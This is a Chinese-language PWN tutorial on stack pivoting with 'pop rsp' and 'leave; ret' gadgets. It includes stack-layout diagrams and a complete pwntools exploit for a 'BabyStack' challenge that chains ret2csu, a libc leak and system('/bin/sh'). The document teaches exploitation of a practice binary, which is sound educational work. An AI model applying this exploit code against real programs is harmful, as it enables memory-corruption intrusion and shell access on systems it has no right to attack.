## 1. 栈迁移简介

**栈迁移**是一种 PWN 利用技巧，其核心思想是：

> **劫持栈指针（SP）指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。**

简单来说，就是将程序的栈"搬移"到我们可以控制的内存区域（如 BSS 段、堆空间等），从而在目标区域构造并执行 ROP 链。

---

## 2. 使用场景

一般来说，我们可能在以下情况需要使用栈迁移：

### 2.1 可控制的栈溢出字节数较少

当缓冲区溢出能够覆盖的字节数有限时，**难以构造较长的 ROP 链**。通过栈迁移，可以先将栈指针转移到更大的可控区域，再在该区域布置完整的 ROP 链。

### 2.2 开启了 ASLR 保护

当 ASLR（地址空间布局随机化）开启时，**栈地址未知**，无法直接跳转到栈上的 shellcode 或 ROP 链。通过栈迁移，可以将栈劫持到**已知的区域**（如 BSS 段、数据段等固定地址处）。

### 2.3 需要进行漏洞利用转换

其它漏洞难以直接利用时，需要进行转换。例如：
- 将栈劫持到**堆空间**，从而在堆上写 ROP 并进行堆漏洞利用
- 将栈劫持到**BSS 段**，利用已知地址构造 ROP 链

---

## 3. 利用要求

利用栈迁移有以下几个**必要条件**：

| 要求 | 说明 |
|:----:|:----:|
| 可以控制程序执行流 | 能够劫持 RIP/EIP，使程序跳转到我们指定的代码位置 |
| 可以控制 SP 指针 | 能够通过某种方式修改栈指针（RSP/ESP），使其指向可控内存 |

### 常见的控制栈指针的 Gadgets

一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是：

- **`pop rsp` / `pop esp`**：直接从栈上弹出值到栈指针寄存器
- **`leave; ret`**：通过 `mov esp/rsp, ebp/rbp` + `pop ebp/rbp` + `ret` 组合实现栈迁移

---

## 4. 方法一：pop rsp 栈迁移

### 4.1 原理

如果程序中存在 `pop rsp` 相关的 gadget，可以很容易地通过 `pop rsp` 来进行栈迁移。

### 4.2 示例

在 pwntools 中搜索 gadget：

```
(chall/ELF/x86_64)> search pop rsp
[INFO] Searching for gadgets: pop rsp

[INFO] File: chall
0x000000000040070d: pop rsp; pop r13; pop r14; pop r15; ret;
```

### 4.3 利用方式

找到 `pop rsp; pop r13; pop r14; pop r15; ret;` 这样的 gadget 后：

1. 将返回地址覆盖为该 gadget 的地址
2. 在栈上依次布置：
   - `pop rsp` 弹出的值 → **目标栈地址**（如 BSS 段地址）
   - `pop r13` 弹出的值 → 填充数据
   - `pop r14` 弹出的值 → 填充数据
   - `pop r15` 弹出的值 → 填充数据
   - `ret` → 跳转到目标栈地址处继续执行

```
栈布局：
┌──────────────────────────────────────┐
│  返回地址: pop_rsp_gadget             │ ← 覆盖返回地址
──────────────────────────────────────┤
│  目标栈地址 (如 BSS)                   │ ← pop rsp
├──────────────────────────────────────┤
│  填充数据                              │ ← pop r13
├──────────────────────────────────────┤
│  填充数据                              │ ← pop r14
├──────────────────────────────────────┤
│  填充数据                              │ ← pop r15
├──────────────────────────────────────┤
│  下一跳地址 (目标栈上的ROP链起始)       │ ← ret
└──────────────────────────────────────┘
```

执行后，RSP 指向目标地址，`ret` 从目标地址处取指令执行，完成栈迁移。

## 5. 方法二：leave ret 栈迁移

### 5.1 原理

另一种栈迁移的方式是通过**控制 rbp**，结合 **`leave; ret`** 指令进行的。

### 5.2 leave 和 ret 指令展开

```asm
leave:
    mov esp, ebp;    ; 将 esp 设置为 ebp 的值（栈帧迁移）
    pop ebp;         ; 弹出新的 ebp（从栈上读取）

ret:
    pop rip;         ; 弹出返回地址到 rip（执行流控制）
```

**64 位下等价于：**

```asm
leave:
    mov rsp, rbp;    ; 将 rsp 设置为 rbp 的值
    pop rbp;         ; 弹出新的 rbp

ret:
    pop rip;         ; 弹出返回地址到 rip
```

### 5.3 利用方式

在进行 `leave; ret` 前，**提前控制好 ebp/rbp**，即可将 esp/rsp 劫持至 ebp/rbp 的位置，经过一次 `pop` 后，进入布置好的 ROP 链中。

具体步骤：

1. **第一次溢出**：控制 rbp 为**目标栈地址 - 8**（因为 `pop rbp` 会再弹 8 字节），返回地址设为 `leave_ret` gadget
2. **执行 `leave`**：`rsp = rbp`（指向目标区域），`pop rbp`（弹出目标区域的数据）
3. **执行 `ret`**：`pop rip`，从目标区域取指令执行

```
栈布局（迁移前）：
┌──────────────────────────────────────┐
│  填充数据（覆盖缓冲区）                 │
├──────────────────────────────────────┤
│  伪造的 rbp = 目标地址 - 8             │ ← leave 后 rsp 指向这里
├──────────────────────────────────────┤
│  返回地址: leave_ret gadget           │ ← 执行 leave; ret
└──────────────────────────────────────┘

目标区域（迁移后）：
┌──────────────────────────────────────┐
│  新的 rbp 值（可继续伪造）              │ ← pop rbp 弹出
├──────────────────────────────────────┤
│  ROP 链起始地址                        │ ← ret 弹出到 rip
├──────────────────────────────────────┤
│  ROP 链内容...                         │
└──────────────────────────────────────┘
```

### 5.4 多次迁移

`leave; ret` 可以**连续使用**，实现多次栈迁移，逐步将栈转移到最终目标位置。每次迁移都需要在目标位置提前布置好新的 rbp 值和后续 ROP 链。

## 6. 实战：BabyStack 完整 Exploit

### 6.1 关键地址

```python
leave_ret = 0x4006A3
pop_rdi = 0x0000000000400713
pop_rsp_3 = 0x000000000040070d  # pop rsp; pop r13; pop r14; pop r15; ret
```

### 6.2 csu 函数封装

```python
def csu(rdi, rsi, rdx, func):
    payload = p64(0x40070A) + p64(0) + p64(1) + p64(func) + p64(rdx) + p64(rsi) + p64(rdi) + p64(0x4006F0)
    payload += 'A' * 56
    return payload
```

### 6.3 完整 Exploit 代码

```python
from pwn import *

s = process("./BabyStack")
elf = ELF("./BabyStack")
gdb.attach(s, "b *0x4006A3\n")

leave_ret = 0x4006A3
pop_rdi = 0x0000000000400713
pop_rsp_3 = 0x000000000040070d

def csu(rdi, rsi, rdx, func):
    payload = p64(0x40070A) + p64(0) + p64(1) + p64(func) + p64(rdx) + p64(rsi) + p64(rdi) + p64(0x4006F0)
    payload += 'A' * 56
    return payload

# === 第一次输入：栈迁移到 BSS(0x500) ===
# 使用 ret2csu 调用 read(0, bss(0x500), 0x500)，将后续 payload 读入 BSS 段
payload = csu(0, elf.bss(0x500), 0x500, elf.got['read']) + p64(pop_rsp_3) + p64(elf.bss(0x500) - 3 * 8)
s.sendafter("Give me your name:", payload)

# === 第二次输入：利用 leave_ret 进行栈迁移 ===
# 覆盖 rbp 为 bss(0x500) 附近地址，返回地址设为 leave_ret
s.sendafter("Input your content.", 'A' * 0x20 + p64(0x601080 - 8) + p64(leave_ret))

# === 此时栈已迁移到 BSS(0x500)，执行以下 ROP 链 ===
# 第一步：puts 泄露 libc 地址
payload = p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
# 第二步：再次 read 写入更多数据到 BSS(0x800)
payload += csu(0, elf.bss(0x800), 0x500, elf.got['read']) + p64(pop_rsp_3) + p64(elf.bss(0x800) - 3 * 8)
s.send(payload)

# === 计算 libc 基址 ===
libc = ELF("./libc-2.31.so")
libc.address = u64(s.recvuntil("\x7f")[-6:] + "\x00\x00") - libc.sym['puts']
success(hex(libc.address))

# === 最终攻击：system("/bin/sh") ===
payload = p64(pop_rdi) + p64(next(libc.search("/bin/sh"))) + p64(libc.sym['system'])
s.send(payload)

s.interactive()
```

### 6.4 Exploit 流程详解

```
┌──────────────────────────────────────────────────────────────────┐
│  阶段一：第一次 read — 将 ROP 链写入 BSS(0x500)                    │
│                                                                  │
│  通过 ret2csu 调用: read(0, bss(0x500), 0x500)                    │
│  然后 pop_rsp_3 将栈迁移到 bss(0x500) - 3*8                       │
──────────────────────────────────────────────────────────────────┤
│  阶段二：leave_ret 栈迁移                                          │
│                                                                  │
│  第二次输入时，覆盖 rbp = 0x601080 - 8，返回地址 = leave_ret        │
│  执行 leave: rsp = rbp = 0x601080 - 8                            │
│  执行 ret:  跳转到 0x601080 处的 ROP 链                            │
├──────────────────────────────────────────────────────────────────┤
│  阶段三：泄露 libc 地址                                            │
│                                                                  │
│  puts(got['puts']) → 泄露 puts 的真实地址                          │
│  libc_base = puts_addr - libc.sym['puts']                         │
├──────────────────────────────────────────────────────────────────┤
│  阶段四：第二次 read — 将最终 payload 写入 BSS(0x800)              │
│                                                                  │
│  通过 ret2csu 调用: read(0, bss(0x800), 0x500)                    │
│  然后 pop_rsp_3 将栈迁移到 bss(0x800) - 3*8                       │
├──────────────────────────────────────────────────────────────────┤
│  阶段五：system("/bin/sh") 获取 shell                              │
│                                                                  │
│  pop_rdi → "/bin/sh" 地址                                         │
│  system("/bin/sh")                                                │
└──────────────────────────────────────────────────────────────────┘
```

### 6.5 关键技术组合

本例综合运用了多种技术：

| 技术 | 用途 |
|:----:|:----:|
| **ret2csu** | 控制 rdi/rsi/rdx 三个参数，调用 read/puts 等函数 |
| **pop rsp 栈迁移** | 将栈指针迁移到 BSS 段，执行更长的 ROP 链 |
| **leave ret 栈迁移** | 通过控制 rbp 实现栈迁移 |
| **多次 read** | 分阶段将数据写入不同位置，逐步推进攻击 |
| **libc 泄露** | 通过 puts 泄露 libc 地址，计算 system 和 "/bin/sh" 地址 |

---

## 7. 总结

### 两种栈迁移方法对比

| 特性 | pop rsp 方法 | leave ret 方法 |
|:----:|:-----------:|:-------------:|
| **所需 gadget** | `pop rsp; ...; ret` | `leave; ret` |
| **控制方式** | 直接弹出目标地址到 rsp | 通过控制 rbp 间接控制 rsp |
| **适用场景** | 程序中存在 pop rsp gadget | 程序中存在 leave_ret（几乎所有函数末尾都有） |
| **灵活性** | 需要额外 pop 填充寄存器 | 更简洁，只需控制 rbp |
| **常见程度** | 较少见 | 非常常见（函数返回时天然存在） |

### 核心要点

1. **栈迁移的本质**：将栈指针 SP 指向攻击者可控的内存区域，在该区域构造 ROP 链。

2. **迁移目标选择**：通常选择 **BSS 段**（地址固定、可读写）或**堆空间**（需要堆漏洞配合）。

3. **pop rsp 注意事项**：`pop rsp; pop r13; pop r14; pop r15; ret` 会连续弹出 4 个值，需要正确计算偏移。目标地址 = 布置位置 - 3×8（减去 r13/r14/r15 占用的 24 字节）。

4. **leave ret 注意事项**：`leave` 先执行 `mov rsp, rbp`，再 `pop rbp`，所以 rbp 应设为**目标地址 - 8**，这样 `pop rbp` 后 rsp 正好指向目标地址。

5. **多次迁移**：可以组合使用 pop rsp 和 leave ret，实现多次栈迁移，逐步将栈转移到最终目标位置。
